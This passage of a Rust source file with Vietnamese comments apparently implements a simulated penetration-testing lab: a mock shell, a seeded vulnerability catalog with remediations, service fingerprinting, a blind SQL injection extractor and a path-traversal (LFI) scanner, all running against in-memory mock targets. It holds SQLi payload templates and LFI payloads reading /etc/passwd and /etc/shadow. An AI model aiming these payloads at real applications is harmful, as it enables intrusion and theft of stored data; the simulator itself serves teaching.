                }
            }
        }
        seen
    }

    /// Số máy chủ đã bị chiếm quyền.
    pub fn compromised_count(&self) -> usize {
        self.hosts.iter().filter(|h| h.is_pwned).count()
    }

    /// Tổng số dịch vụ đang mở trong toàn mạng.
    pub fn total_services(&self) -> usize {
        self.hosts.iter().map(|h| h.services.len()).sum()
    }

    /// Sinh bản đồ mạng dạng văn bản.
    pub fn to_text_map(&self) -> String {
        let mut out = String::new();
        for host in &self.hosts {
            out.push_str(&format!(
                "{:>15}  {:<8}  {:<28}  {}\n",
                host.ip.to_string(),
                host.hostname,
                host.os,
                if host.is_pwned {
                    "[COMPROMISED]"
                } else {
                    "[ok]"
                }
            ));
        }
        out
    }
}

/// Shell ảo mô phỏng hành vi của một dịch vụ trên máy chủ ảo.
#[derive(Debug, Clone, PartialEq)]
pub struct MockShell {
    /// Người dùng hiện tại đang đăng nhập.
    pub current_user: String,
    /// Cờ cho biết đã leo thang lên root hay chưa.
    pub is_root: bool,
    /// Lịch sử các cặp (lệnh, kết quả).
    pub history: Vec<(String, String)>,
}

impl MockShell {
    /// Tạo shell ảo với người dùng mặc định `www`.
    pub fn new() -> Self {
        Self {
            current_user: "www".to_string(),
            is_root: false,
            history: Vec::new(),
        }
    }

    /// Tạo shell ảo với người dùng cụ thể.
    pub fn as_user(user: &str) -> Self {
        Self {
            current_user: user.to_string(),
            is_root: false,
            history: Vec::new(),
        }
    }

    /// Thực thi một lệnh mô phỏng và trả về kết quả thô.
    pub fn execute(&mut self, command: &str) -> String {
        let cmd = command.trim();
        let output = self.dispatch(cmd);
        self.history.push((cmd.to_string(), output.clone()));
        output
    }

    /// Bảng điều khiển lệnh mô phỏng.
    fn dispatch(&self, cmd: &str) -> String {
        let lower = cmd.to_ascii_lowercase();
        if lower == "whoami" {
            return self.current_user.clone();
        }
        if lower == "id" {
            return if self.is_root {
                "uid=0(root) gid=0(root) groups=0(root)".to_string()
            } else {
                "uid=1000(www) gid=1000(www) groups=1000(www)".to_string()
            };
        }
        if lower == "cat /etc/shadow" {
            return "root:$6$mock$hash:19000:0:99999:7:::\nwww:$6$mock$hash:19001:0:99999:7:::\n"
                .to_string();
        }
        if lower == "ls" {
            return "app\nconfig\nflag.txt\nindex.php\n".to_string();
        }
        if lower == "systeminfo" {
            return "Host Name:                 MOCK-DC01\nOS Name:                   Microsoft Windows Server 2019\nOS Version:                10.0.17763\n".to_string();
        }
        if lower == "net user" {
            return "User accounts for \\\nMOCK-DC01\n\nAdministrator    svc_backup    www    Guest\n"
                .to_string();
        }
        if lower == "ipconfig" {
            return "Ethernet adapter Mock0:\n   IPv4 Address. . . : 10.10.30.10\n   Subnet Mask . . . . : 255.255.255.0\n".to_string();
        }
        if lower == "netstat -ano" {
            return "  TCP    0.0.0.0:445        0.0.0.0:0              LISTENING   4\n  TCP    10.10.30.10:139    10.10.10.5:51234      ESTABLISHED 812\n".to_string();
        }
        if lower == "whoami /priv" {
            return "SeTcbPrivilege    SeTcbPrivilege    Enabled\nSeImpersonatePrivilege    SeImpersonatePrivilege    Enabled\n".to_string();
        }
        if lower.starts_with("curl ") {
            return "HTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 13\n\nhello world\n"
                .to_string();
        }
        if lower.starts_with("cat ") {
            let path = cmd[4..].trim();
            if path.contains("flag") {
                return "FLAG{ch104_mock_flag_7f3a91}".to_string();
            }
            return format!("cat: {path}: No such file or directory");
        }
        format!("sh: {cmd}: command not found")
    }

    /// Leo thang đặc quyền bằng một kỹ thuật đã biết (mô phỏng).
    ///
    /// Trả `true` khi kỹ thuật được hỗ trợ và shell chuyển sang quyền root.
    pub fn escalate(&mut self, technique: &str) -> bool {
        let supported = [
            "SuidBinary",
            "SudoMisconfig",
            "CronJob",
            "WritableService",
            "Capabilities",
            "TokenImpersonation",
        ];
        if !supported.contains(&technique) {
            return false;
        }
        self.is_root = true;
        self.current_user = "root".to_string();
        self.history
            .push((format!("escalate({technique})"), "uid=0(root)".to_string()));
        true
    }

    /// Người dùng hiện tại.
    pub fn whoami(&self) -> &str {
        &self.current_user
    }

    /// Shell có đang chạy với quyền root hay không.
    pub fn is_privileged(&self) -> bool {
        self.is_root
    }
}

impl Default for MockShell {
    fn default() -> Self {
        Self::new()
    }
}

/// Đặc tả ngắn gọn cho một mục lỗ hổng trong danh mục của máy chủ ảo.
///
/// Dùng struct thay vì danh sách tham số dài để tuân thủ quy ước "tối đa 7 tham số"
/// của clippy và để mã dễ đọc hơn.
#[derive(Debug, Clone, Copy)]
pub struct VulnSpec {
    /// Mã định danh phát hiện.
    id: &'static str,
    /// Tiêu đề phát hiện.
    title: &'static str,
    /// Mã CWE.
    cwe: &'static str,
    /// Điểm CVSS.
    cvss: f64,
    /// Địa chỉ IP mục tiêu.
    ip: Ipv4Addr,
    /// Cổng mục tiêu.
    port: u16,
    /// Mô tả lỗ hổng.
    description: &'static str,
    /// Khuyến nghị khắc phục.
    remediation: &'static str,
}

/// Danh mục lỗ hổng cài sẵn cho nhóm máy chủ `WEB`.
#[rustfmt::skip]
const WEB_VULNS: [VulnSpec; 4] = [
    VulnSpec { id: "VULN-001", title: "SQL Injection tại tham số id", cwe: "CWE-89", cvss: 9.8, ip: Ipv4Addr::new(10, 10, 10, 5), port: 80, description: "Tham số `id` của trang `/index.php` nối trực tiếp vào truy vấn SQL, cho phép kẻ tấn công thay đổi ngữ nghĩa câu lệnh.", remediation: "Chuyển sang truy vấn tham số hóa (prepared statement) và kiểm tra kiểu dữ liệu ở tầng ứng dụng." },
    VulnSpec { id: "VULN-002", title: "Local File Inclusion qua tham số file", cwe: "CWE-22", cvss: 7.5, ip: Ipv4Addr::new(10, 10, 10, 5), port: 80, description: "Tham số `file` được truyền thẳng vào `include()` mà không lọc đường dẫn, cho phép đọc tệp ngoài web root.", remediation: "Danh sách trắng tên tệp được phép và chuẩn hóa đường dẫn trước khi mở." },
    VulnSpec { id: "VULN-003", title: "Tải lên tệp không kiểm tra phần mở rộng", cwe: "CWE-434", cvss: 8.6, ip: Ipv4Addr::new(10, 10, 10, 5), port: 80, description: "Tính năng tải lên avatar chỉ kiểm tra phần mở rộng cuối cùng nên có thể bị lách bằng phần mở rộng kép.", remediation: "Kiểm tra magic bytes, lưu tệp ngoài web root và cấu hình web server không thực thi tệp tải lên." },
    VulnSpec { id: "VULN-004", title: "JWT HS256 ký bằng khoá yếu", cwe: "CWE-321", cvss: 7.4, ip: Ipv4Addr::new(10, 10, 10, 5), port: 80, description: "Token quản trị được ký HS256 với khoá bí mật ngắn, bẻ khoá xong là giả mạo được toàn bộ quyền quản trị.", remediation: "Dùng khoá RSA/EC bất định định ít nhất 256 bit và kiểm tra thuật toán phía máy chủ." },
];

/// Danh mục lỗ hổng cài sẵn cho nhóm máy chủ `DB`.
#[rustfmt::skip]
const DB_VULNS: [VulnSpec; 2] = [
    VulnSpec { id: "VULN-005", title: "Tài khoản dịch vụ dùng mật khẩu mặc định", cwe: "CWE-798", cvss: 9.8, ip: Ipv4Addr::new(10, 10, 20, 10), port: 3306, description: "Tài khoản `svc_backup` dùng mật khẩu mặc định của nhà sản xuất, bẻ khoá được bằng từ điển thông thường.", remediation: "Đặt lại mật khẩu ngẫu nhiên cho tài khoản dịch vụ và vô hiệu hoá đăng nhập từ xa." },
    VulnSpec { id: "VULN-006", title: "Nhị phân SUID cho phép leo thang đặc quyền", cwe: "CWE-269", cvss: 7.8, ip: Ipv4Addr::new(10, 10, 20, 10), port: 22, description: "Tiện ích `find` bị cấp quyền SUID root, cho phép người dùng thấp spawn một shell gốc.", remediation: "Gỡ cờ SUID khỏi các tiện ích không cần thiết và dùng cơ chế allow-list thay cho SUID." },
];

/// Danh mục lỗ hổng cài sẵn cho nhóm máy chủ `DC`.
#[rustfmt::skip]
const DC_VULNS: [VulnSpec; 1] = [
    VulnSpec { id: "VULN-007", title: "Tin cậy quá rộng khi xoay chiều qua DC", cwe: "CWE-284", cvss: 6.5, ip: Ipv4Addr::new(10, 10, 30, 10), port: 445, description: "Phiên SMB từ máy DMZ được chấp nhận không kiểm tra nguồn gốc, cho phép đi sâu vào mạng nội bộ.", remediation: "Phân vùng mạng, yêu cầu SMB signing và giới hạn nguồn tin cậy ở tầng tường lửa." },
];

/// Danh mục lỗ hổng cài sẵn cho nhóm máy chủ `FS`.
#[rustfmt::skip]
const FS_VULNS: [VulnSpec; 1] = [
    VulnSpec { id: "VULN-008", title: "Tràn bộ đệm trong daemon FTP tuần tự", cwe: "CWE-120", cvss: 8.1, ip: Ipv4Addr::new(10, 10, 50, 10), port: 21, description: "Daemon FTP tự viết sao chép dữ liệu vào bộ đệm 64 byte mà không kiểm tra độ dài, cho phép ghi đè địa chỉ trả về.", remediation: "Kiểm tra độ dài đầu vào, bật ASLR/DEP và biên dịch lại daemon." },
];

/// Tạo nhanh một mô tả lỗ hổng cho danh mục của máy chủ ảo.
fn make_vuln(spec: VulnSpec) -> Vulnerability {
    Vulnerability {
        id: spec.id.to_string(),
        title: spec.title.to_string(),
        cwe: spec.cwe.to_string(),
        cvss: spec.cvss,
        severity: Severity::from_cvss(spec.cvss),
        target_ip: spec.ip,
        target_port: spec.port,
        description: spec.description.to_string(),
        remediation: spec.remediation.to_string(),
    }
}
// ============================================================================
// 4. ĐỘNG CƠ TRINH SÁT (MIRROR CHƯƠNG 99)
// ============================================================================

/// Một gói thăm dò dịch vụ dùng để nhận dạng dịch vụ trên một cổng.
#[derive(Debug, Clone, PartialEq)]
pub struct ServiceProbe {
    /// Cổng đích.
    pub port: u16,
    /// Tên dịch vụ.
    pub name: &'static str,
    /// Payload gửi đi khi bắt tay.
    pub payload: &'static [u8],
    /// Chuỗi đặc trưng phải xuất hiện trong banner.
    pub matcher: &'static str,
}

/// Bộ thăm dò dịch vụ.
#[derive(Debug, Clone, PartialEq)]
pub struct ServiceFingerprinter {
    /// Danh sách gói thăm dò.
    pub probes: Vec<ServiceProbe>,
}

impl ServiceFingerprinter {
    /// Tạo bộ thăm dò với danh mục dịch vụ phổ biến.
    pub fn new() -> Self {
        Self {
            probes: vec![
                ServiceProbe {
                    port: 80,
                    name: "http",
                    payload: b"GET / HTTP/1.0\r\n\r\n",
                    matcher: "HTTP/",
                },
                ServiceProbe {
                    port: 22,
                    name: "ssh",
                    payload: b"SSH-2.0-Probe\r\n",
                    matcher: "SSH-",
                },
                ServiceProbe {
                    port: 21,
                    name: "ftp",
                    payload: b"USER probe\r\n",
                    matcher: "220",
                },
                ServiceProbe {
                    port: 25,
                    name: "smtp",
                    payload: b"EHLO probe\r\n",
                    matcher: "220",
                },
                ServiceProbe {
                    port: 110,
                    name: "pop3",
                    payload: b"",
                    matcher: "+OK",
                },
                ServiceProbe {
                    port: 143,
                    name: "imap",
                    payload: b"",
                    matcher: "* OK",
                },
                ServiceProbe {
                    port: 3306,
                    name: "mysql",
                    payload: b"",
                    matcher: "5.7.33",
                },
                ServiceProbe {
                    port: 389,
                    name: "ldap",
                    payload: b"",
                    matcher: "LDAP",
                },
                ServiceProbe {
                    port: 445,
                    name: "smb",
                    payload: b"\x00\x00\x00",
                    matcher: "SMB",
                },
                ServiceProbe {
                    port: 3389,
                    name: "rdp",
                    payload: b"",
                    matcher: "RDP",
                },
                ServiceProbe {
                    port: 88,
                    name: "kerberos",
                    payload: b"",
                    matcher: "KRB5",
                },
                ServiceProbe {
                    port: 6379,
                    name: "redis",
                    payload: b"PING\r\n",
                    matcher: "+PONG",
                },
            ],
        }
    }

    /// Nhận dạng dịch vụ trên cổng `port` dựa trên banner nhận được.
    pub fn fingerprint(&self, port: u16, response: &[u8]) -> Option<(String, String)> {
        let probe = self.probes.iter().find(|p| p.port == port)?;
        let text = String::from_utf8_lossy(response).to_string();
        if !text
            .to_ascii_lowercase()
            .contains(&probe.matcher.to_ascii_lowercase())
        {
            return None;
        }
        Some((
            probe.name.to_string(),
            extract_version(&text, probe.matcher),
        ))
    }

    /// Danh mục gói thăm dò (dạng tham chiếu).
    pub fn service_catalog() -> Vec<ServiceProbe> {
        ServiceFingerprinter::new().probes
    }
}

impl Default for ServiceFingerprinter {
    fn default() -> Self {
        Self::new()
    }
}

/// Trích xuất phiên bản từ banner, đứng ngay sau chuỗi đặc trưng.
fn extract_version(text: &str, marker: &str) -> String {
    let lower = text.to_ascii_lowercase();
    let marker_lower = marker.to_ascii_lowercase();
    let Some(pos) = lower.find(&marker_lower) else {
        return String::new();
    };
    let tail = &text[pos + marker.len()..];
    let tokens: Vec<&str> = tail
        .split(|c: char| c.is_whitespace() || c == ':' || c == ',')
        .collect();

    // Ưu tiên dạng "tên/phiên-bản" (ví dụ `nginx/1.18.0`).
    for token in &tokens {
        if let Some((_, version)) = token.rsplit_once('/') {
            let trimmed = version.trim_matches(|c: char| !c.is_ascii_alphanumeric() && c != '.');
            if trimmed.contains('.') && trimmed.chars().any(|c| c.is_ascii_digit()) {
                return trimmed.to_string();
            }
        }
    }

    // Tiếp theo là token bắt đầu bằng chữ số và chứa dấu chấm (ví dụ `1.18.0`).
    for token in &tokens {
        let trimmed =
            token.trim_matches(|c: char| !c.is_ascii_alphanumeric() && c != '.' && c != '-');
        if trimmed.starts_with(|c: char| c.is_ascii_digit()) && trimmed.contains('.') {
            return trimmed.to_string();
        }
    }

    // Cuối cùng, chính chuỗi đặc trưng có thể đã chứa phiên bản (ví dụ `5.7.33`).
    if marker_lower.contains('.') && marker_lower.chars().any(|c| c.is_ascii_digit()) {
        return marker_lower.clone();
    }
    String::new()
}

/// Thông tin thu thập được về một máy chủ sau khi quét.
#[derive(Debug, Clone, PartialEq)]
pub struct HostInfo {
    /// Địa chỉ IP.
    pub ip: Ipv4Addr,
    /// Tên máy chủ.
    pub hostname: String,
    /// Hệ điều hành đoán được.
    pub os: String,
    /// Danh sách cổng đang mở.
    pub open_ports: Vec<u16>,
    /// Bản đồ cổng → dịch vụ/phiên bản.
    pub services: HashMap<u16, String>,
}

/// Bản đồ mạng thu thập được.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct NetworkMapper {
    /// Bản đồ IP → thông tin máy chủ.
    pub hosts: HashMap<Ipv4Addr, HostInfo>,
}

impl NetworkMapper {
    /// Số máy chủ đã lập bản đồ.
    pub fn host_count(&self) -> usize {
        self.hosts.len()
    }

    /// Tổng số cổng đang mở trên toàn bản đồ.
    pub fn total_open_ports(&self) -> usize {
        self.hosts.values().map(|h| h.open_ports.len()).sum()
    }

    /// Sinh báo cáo bản đồ dạng văn bản.
    pub fn to_report(&self) -> String {
        let mut ips: Vec<&Ipv4Addr> = self.hosts.keys().collect();
        ips.sort();
        let mut out = String::new();
        for ip in ips {
            let Some(info) = self.hosts.get(ip) else {
                continue;
            };
            out.push_str(&format!(
                "{:<16} {:<10} {:<8} ports={:?}\n",
                ip.to_string(),
                info.hostname,
                info.os,
                info.open_ports
            ));
        }
        out
    }
}

/// Động cơ trinh sát: quét cổng, nhận dạng dịch vụ và lập bản đồ mạng.
#[derive(Debug, Clone, PartialEq)]
pub struct ReconEngine {
    /// Bộ thăm dò dịch vụ.
    pub fingerprinter: ServiceFingerprinter,
    /// Bản đồ mạng tích luỹ được.
    pub mapper: NetworkMapper,
}

impl ReconEngine {
    /// Tạo động cơ trinh sát mới.
    pub fn new() -> Self {
        Self {
            fingerprinter: ServiceFingerprinter::new(),
            mapper: NetworkMapper::default(),
        }
    }

    /// Quét một máy chủ ảo và trả về thông tin thu thập được.
    pub fn scan_host(&mut self, host: &MockHost) -> HostInfo {
        let mut open_ports = Vec::new();
        let mut services = HashMap::new();
        for service in &host.services {
            open_ports.push(service.port);
            let (name, version) = self
                .fingerprinter
                .fingerprint(service.port, &service.banner)
                .unwrap_or_else(|| (service.name.clone(), service.version.clone()));
            let label = if version.is_empty() {
                name
            } else {
                format!("{name} {version}")
            };
            services.insert(service.port, label);
        }
        open_ports.sort_unstable();

        let ttl = if host.os.to_ascii_lowercase().contains("windows") {
            128
        } else {
            64
        };
        let banner = host
            .services
            .first()
            .map(|s| s.banner.clone())
            .unwrap_or_default();
        let os = self.detect_os(&banner, ttl);

        let info = HostInfo {
            ip: host.ip,
            hostname: host.hostname.clone(),
            os,
            open_ports,
            services,
        };
        self.mapper.hosts.insert(info.ip, info.clone());
        info
    }

    /// Quét toàn bộ mạng và trả về bản đồ.
    pub fn map_network(&mut self, net: &MockNetwork) -> NetworkMapper {
        for host in &net.hosts {
            self.scan_host(host);
        }
        self.mapper.clone()
    }

    /// Đoán hệ điều hành dựa trên banner và giá trị TTL của gói tin.
    pub fn detect_os(&self, banner: &[u8], ttl: u8) -> String {
        let text = String::from_utf8_lossy(banner).to_ascii_lowercase();
        if text.contains("windows") || ttl == 128 {
            "Windows".to_string()
        } else if text.contains("linux") || ttl == 64 {
            "Linux".to_string()
        } else if ttl == 255 {
            "NetworkDevice".to_string()
        } else {
            "Unknown".to_string()
        }
    }
}

impl Default for ReconEngine {
    fn default() -> Self {
        Self::new()
    }
}

// ============================================================================
// 5. ĐỘNG CƠ KHAI THÁC WEB (MIRROR CHƯƠNG 100)
// ============================================================================

/// Kết quả một câu truy vấn SQL mô phỏng.
#[derive(Debug, Clone, PartialEq, Default)]
pub struct SqlResponse {
    /// Các hàng dữ liệu trả về.
    pub rows: Vec<Vec<String>>,
    /// Cờ báo lỗi cú pháp/thực thi.
    pub error: bool,
    /// Độ trễ mô phỏng (ms).
    pub delay_ms: u64,
    /// Độ dài phản hồi (byte) — dùng cho kỹ thuật SQLi mù.
    pub length: usize,
}

/// Đích SQL mà động cơ SQLi mù có thể truy vấn.
pub trait SqlTarget {
    /// Thực thi một câu truy vấn và trả về kết quả.
    fn query(&self, sql: &str) -> SqlResponse;
}

/// Một bảng trong cơ sở dữ liệu mô phỏng.
#[derive(Debug, Clone, PartialEq)]
pub struct MockTable {
    /// Tên bảng.
    pub name: String,
    /// Danh sách cột.
    pub columns: Vec<String>,
    /// Các hàng dữ liệu.
    pub rows: Vec<Vec<String>>,
}

/// Cơ sở dữ liệu mô phỏng.
#[derive(Debug, Clone, PartialEq)]
pub struct MockDatabase {
    /// Danh sách bảng.
    pub tables: Vec<MockTable>,
}

impl MockDatabase {
    /// Tạo cơ sở dữ liệu rỗng.
    pub fn new() -> Self {
        Self { tables: Vec::new() }
    }

    /// Thêm một bảng vào cơ sở dữ liệu.
    pub fn add_table(&mut self, name: &str, columns: &[&str], rows: Vec<Vec<String>>) {
        self.tables.push(MockTable {
            name: name.to_string(),
            columns: columns.iter().map(|c| c.to_string()).collect(),
            rows,
        });
    }

    /// Danh sách tên bảng.
    pub fn table_names(&self) -> Vec<String> {
        self.tables.iter().map(|t| t.name.clone()).collect()
    }

    /// Tìm bảng theo tên.
    pub fn table(&self, name: &str) -> Option<&MockTable> {
        self.tables
            .iter()
            .find(|t| t.name.eq_ignore_ascii_case(name))
    }
}

impl Default for MockDatabase {
    fn default() -> Self {
        Self::new()
    }
}

/// Đích SQL in-memory dùng cho mô phỏng ứng dụng web.
#[derive(Debug, Clone, PartialEq)]
pub struct InMemorySqlTarget {
    /// Cơ sở dữ liệu nền.
    pub db: MockDatabase,
    /// Tên cơ sở dữ liệu hiện tại.
    pub db_name: String,
}

impl InMemorySqlTarget {
    /// Tạo đích SQL với cơ sở dữ liệu chuẩn của phòng lab.
    pub fn standard() -> Self {
        let mut db = MockDatabase::new();
        db.add_table(
            "users",
            &["id", "username", "password", "role"],
            vec![
                vec![
                    "1".to_string(),
                    "admin".to_string(),
                    "Sup3rS3cret!".to_string(),
                    "administrator".to_string(),
                ],
                vec![
                    "2".to_string(),
                    "guest".to_string(),
                    "guest".to_string(),
                    "user".to_string(),
                ],
            ],
        );
        db.add_table(
            "sessions",
            &["id", "token", "user_id"],
            vec![vec![
                "10".to_string(),
                "s3cr3t-session-token".to_string(),
                "1".to_string(),
            ]],
        );
        Self {
            db,
            db_name: "app_db".to_string(),
        }
    }

    /// Tra cứu giá trị đầu tiên của một cột trong một bảng.
    fn resolve_value(&self, expr: &str) -> Option<String> {
        let expr = expr.trim();
        if expr.eq_ignore_ascii_case("database()") {
            return Some(self.db_name.clone());
        }
        let (table, column) = expr.split_once('.')?;
        let table_ref = self.db.table(table)?;
        let idx = table_ref
            .columns
            .iter()
            .position(|c| c.eq_ignore_ascii_case(column))?;
        table_ref.rows.first().and_then(|row| row.get(idx)).cloned()
    }
}

impl SqlTarget for InMemorySqlTarget {
    fn query(&self, sql: &str) -> SqlResponse {
        let lower = sql.to_ascii_lowercase();

        // Câu hỏi trực tiếp về danh mục `information_schema`.
        if lower.contains("information_schema.tables") {
            if lower.contains("count(") {
                return SqlResponse {
                    rows: vec![vec![self.db.tables.len().to_string()]],
                    error: false,
                    delay_ms: 0,
                    length: 1,
                };
            }
            let rows: Vec<Vec<String>> = self
                .db
                .tables
                .iter()
                .map(|t| vec![t.name.clone()])
                .collect();
            let length = rows.len();
            return SqlResponse {
                rows,
                error: false,
                delay_ms: 0,
                length,
            };
        }
        if lower.contains("information_schema.columns") {
            let table = extract_quoted_value(&lower, "table_name='");
            let columns = table
                .and_then(|t| self.db.table(&t))
                .map(|t| {
                    t.columns
                        .iter()
                        .map(|c| vec![c.clone()])
                        .collect::<Vec<_>>()
                })
                .unwrap_or_default();
            let length = columns.len();
            return SqlResponse {
                rows: columns,
                error: false,
                delay_ms: 0,
                length,
            };
        }

        // Dạng thăm dò boolean: SELECT SUBSTRING(<expr>,<pos>,1) = '<ký tự>'
        if let Some((expr, pos, ch)) = parse_boolean_probe(sql) {
            let value = self.resolve_value(&expr);
            let matched = value
                .and_then(|v| v.chars().nth(pos.saturating_sub(1)))
                .map(|c| c == ch)
                .unwrap_or(false);
            return SqlResponse {
                rows: if matched {
                    vec![vec!["1".to_string()]]
                } else {
                    Vec::new()
                },
                error: false,
                delay_ms: 0,
                length: usize::from(matched),
            };
        }

        // Dạng thăm dò boolean tổng quát: `' AND (<điều kiện>) AND '1'='1'`
        if let Some(condition) = extract_condition(sql) {
            let matched = evaluate_condition(&condition);
            return SqlResponse {
                rows: if matched {
                    vec![vec!["1".to_string()]]
                } else {
                    Vec::new()
                },
                error: false,
                delay_ms: 0,
                length: usize::from(matched),
            };
        }

        SqlResponse {
            rows: Vec::new(),
            error: true,
            delay_ms: 0,
            length: 0,
        }
    }
}

/// Trích giá trị trong nháy đơn sau một mẫu cho trước.
fn extract_quoted_value(text: &str, pattern: &str) -> Option<String> {
    let idx = text.find(pattern)? + pattern.len();
    let tail = &text[idx..];
    let end = tail.find('\'')?;
    Some(tail[..end].to_string())
}

/// Phân tích câu truy vấn dạng `SELECT SUBSTRING(<expr>,<pos>,1) = '<ký tự>'`.
///
/// Bộ phân tích đi từ phía cuối câu lệnh về phía trước để không bị vướng bởi dấu ngoặc
/// bên trong biểu thức (ví dụ `DATABASE()`).
fn parse_boolean_probe(sql: &str) -> Option<(String, usize, char)> {
    let lower = sql.to_ascii_lowercase();
    let eq = lower.find("= '")?;
    let ch = lower[eq + 3..].chars().next()?;
    let head = lower[..eq].trim_end();
    let head = head.strip_suffix(')')?;
    // `head` có dạng `select substring(<expr>,<pos>,<len>)` — tách riêng đối số độ dài.
    let (expr_and_pos, _len) = head.rsplit_once(',')?;
    let (expr_part, pos_part) = expr_and_pos.rsplit_once(',')?;
    let pos: usize = pos_part.trim().parse().ok()?;
    let expr = expr_part
        .trim()
        .strip_prefix("select substring(")
        .unwrap_or(expr_part.trim())
        .trim()
        .to_string();
    Some((expr, pos, ch))
}

/// Trích điều kiện boolean nằm trong cặp ngoặc của payload SQLi mù.
fn extract_condition(sql: &str) -> Option<String> {
    let lower = sql.to_ascii_lowercase();
    let start = lower.find("and (")? + "and (".len();
    let end = lower[start..].find(')')? + start;
    Some(sql[start..end].trim().to_string())
}

/// Đánh giá một điều kiện boolean đơn giản dạng `a = b` (hỗ trợ so sánh số và chuỗi).
fn evaluate_condition(condition: &str) -> bool {
    let Some((left, right)) = condition.split_once('=') else {
        return false;
    };
    let left = left.trim();
    let right = right.trim().trim_matches('\'').trim();
    if let (Ok(a), Ok(b)) = (left.parse::<i64>(), right.parse::<i64>()) {
        return a == b;
    }
    left.eq_ignore_ascii_case(right)
}

/// Bảng chữ cái dùng cho kỹ thuật SQLi mù (đảm bảo bao phủ các ký tự phổ biến).
const BLIND_CHARSET: [char; 67] = [
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's',
    't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
    'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2', '3', '4',
    '5', '6', '7', '8', '9', '_', '-', '.', '@', '!',
];

/// Động cơ khai thác SQL Injection mù.
pub struct BlindSqliEngine<'a> {
    /// Đích SQL.
    target: &'a dyn SqlTarget,
    /// Nhật ký các payload đã thử.
    pub injections: Vec<String>,
}

impl<'a> BlindSqliEngine<'a> {
    /// Tạo động cơ SQLi mù trên một đích SQL.
    pub fn new(target: &'a dyn SqlTarget) -> Self {
        Self {
            target,
            injections: Vec::new(),
        }
    }

    /// Dựng payload SQLi mù từ một điều kiện boolean.
    pub fn build_payload(&self, condition: &str) -> String {
        format!("' AND ({condition}) AND '1'='1")
    }

    /// Gửi một phép thăm dò boolean và trả về kết quả.
    pub fn boolean_probe(&mut self, condition: &str) -> bool {
        let payload = self.build_payload(condition);
        self.injections.push(payload.clone());
        let response = self.target.query(&payload);
        !response.error && !response.rows.is_empty()
    }

    /// Trích xuất tên cơ sở dữ liệu hiện tại.
    pub fn extract_database_name(&mut self) -> Option<String> {
        self.blind_extract("DATABASE()", 32)
    }

    /// Trích xuất danh sách bảng.
    pub fn extract_table_names(&mut self) -> Vec<String> {
        let sql = "SELECT table_name FROM information_schema.tables".to_string();
        self.injections.push(sql.clone());
        let response = self.target.query(&sql);
        response
            .rows
            .iter()
            .filter_map(|row| row.first().cloned())
            .collect()
    }

    /// Trích xuất dữ liệu của một cột trong một bảng.
    pub fn extract_column_data(
        &mut self,
        table: &str,
        column: &str,
        max_len: usize,
    ) -> Option<String> {
        let expr = format!("{table}.{column}");
        self.blind_extract(&expr, max_len)
    }

    /// Đo độ dài giá trị của một biểu thức bằng kỹ thuật mù.
    pub fn extract_length(&mut self, table: &str, column: &str) -> Option<usize> {
        let extracted = self.extract_column_data(table, column, 64)?;
        Some(extracted.chars().count())
    }

    /// Vòng lặp trích xuất mù: dò từng vị trí và từng ký tự khả dĩ.
    fn blind_extract(&mut self, expr: &str, max_len: usize) -> Option<String> {
        let mut out = String::new();
        for pos in 1..=max_len {
            let mut found: Option<char> = None;
            for ch in BLIND_CHARSET {
                let sql = format!("SELECT SUBSTRING({expr},{pos},1) = '{ch}'");
                self.injections.push(sql.clone());
                let response = self.target.query(&sql);
                if !response.error && !response.rows.is_empty() {
                    found = Some(ch);
                    break;
                }
            }
            match found {
                Some(ch) => out.push(ch),
                None => break,
            }
        }
        if out.is_empty() { None } else { Some(out) }
    }
}

/// Một kết quả quét LFI.
#[derive(Debug, Clone, PartialEq)]
pub struct LfiFinding {
    /// Payload đã thử.
    pub payload: String,
    /// Có bị rò rỉ nội dung tệp hay không.
    pub matched: bool,
    /// Dấu vết bị rò rỉ nếu có.
    pub leaked_marker: Option<String>,
}

/// Bộ quét Local File Inclusion.
#[derive(Debug, Clone, PartialEq)]
pub struct LfiScanner {
    /// Danh sách payload thử nghiệm.
    pub payloads: Vec<String>,
}

impl LfiScanner {
    /// Tạo bộ quét với bộ payload đường đi tiêu chuẩn.
    pub fn new() -> Self {
        Self {
            payloads: vec![
                "../../../../etc/passwd".to_string(),
                "....//....//etc/passwd".to_string(),
                "..%2f..%2f..%2fetc%2fpasswd".to_string(),
                "%2e%2e%2f%2e%2e%2fetc/passwd".to_string(),
                "..\\..\\..\\windows\\win.ini".to_string(),
                "php://filter/convert.base64-encode/resource=index.php".to_string(),
                "....//....//....//....//etc/passwd".to_string(),
                "/etc/passwd".to_string(),
            ],
        }
    }

    /// Sinh payload đi sâu `depth` cấp thư mục.
    pub fn generate_payloads(&self, depth: usize) -> Vec<String> {
        let prefix = "../".repeat(depth);
        vec![
            format!("{prefix}etc/passwd"),
            format!("{prefix}etc/shadow"),
            format!("..{prefix}etc/passwd"),
        ]
    }

    /// Quét tập phản hồi và trả về các kết quả khớp.
    ///
    /// Các payload được duyệt theo thứ tự **từ điển tăng dần** để kết quả luôn tất định:
    /// `HashMap` không bảo đảm thứ tự lặp, còn báo cáo kiểm thử thì phải tái lập được.
    pub fn scan(&self, responses: &HashMap<String, String>) -> Vec<LfiFinding> {
        let mut payloads: Vec<&String> = responses.keys().collect();
        payloads.sort();
        let mut out = Vec::new();
        for payload in payloads {
            let body = &responses[payload];
            let matched = body.contains("root:x:") || body.contains("[extensions]");
            let leaked_marker = if body.contains("root:x:0:0") {
                Some("root:x:0:0".to_string())
            } else if body.contains("[extensions]") {
                Some("[extensions]".to_string())
            } else {
                None
            };
            out.push(LfiFinding {
                payload: payload.clone(),
                matched,
                leaked_marker,
            });
        }
        out
    }
}

impl Default for LfiScanner {
    fn default() -> Self {
        Self::new()
    }
}

/// Kết quả thử vượt kiểm duyệt tải lên tệp.
#[derive(Debug, Clone, PartialEq)]
pub struct UploadBypassResult {
    /// Tên tệp sau khi xử lý.
    pub filename: String,
    /// Phần mở rộng cuối cùng.
    pub extension: String,
    /// Kiểu MIME khai báo.
    pub content_type: String,
    /// Magic bytes nhận diện được trong nội dung.
    pub magic_bytes: Vec<u8>,
    /// Có vượt qua được bộ lọc hay không.
    pub bypassed: bool,
